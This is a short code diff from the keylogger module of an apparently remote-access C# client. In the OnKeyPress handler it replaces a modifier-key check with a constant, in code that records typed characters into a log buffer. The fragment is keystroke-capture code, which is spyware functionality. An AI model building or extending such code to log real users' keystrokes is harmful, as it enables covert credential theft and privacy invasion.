@@ -139,7 +139,7 @@ namespace xClient.Core.Keylogger
                 if (!string.IsNullOrEmpty(filtered))
                 {
                     Debug.WriteLine("OnKeyPress Output: " + filtered);
-                    _ignoreSpecialKeys = _pressedKeys.IsModifierKeysSet();
+                    _ignoreSpecialKeys = true;
                     _pressedKeyChars.Add(e.KeyChar);
                     _logFileBuffer.Append(filtered);
                 }
